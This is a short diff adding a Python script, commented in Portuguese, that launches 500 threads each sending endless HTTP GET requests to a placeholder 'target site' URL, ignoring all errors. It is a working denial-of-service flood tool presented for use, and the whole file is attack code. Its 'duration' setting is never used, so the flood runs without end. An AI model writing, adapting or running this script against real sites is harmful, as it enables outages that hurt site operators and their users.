@@ -1,0 +1,17 @@
+# Script Python simples (ajuste threads e tempo)
+import requests
+import threading
+
+url = "http://site-alvo.com"
+threads = 500  # Quantas conexões paralelas
+duration = 120  # segundos
+
+def flood():
+    while True:
+        try:
+            requests.get(url, timeout=1)
+        except:
+            pass
+
+for _ in range(threads):
+    threading.Thread(target=flood).start()
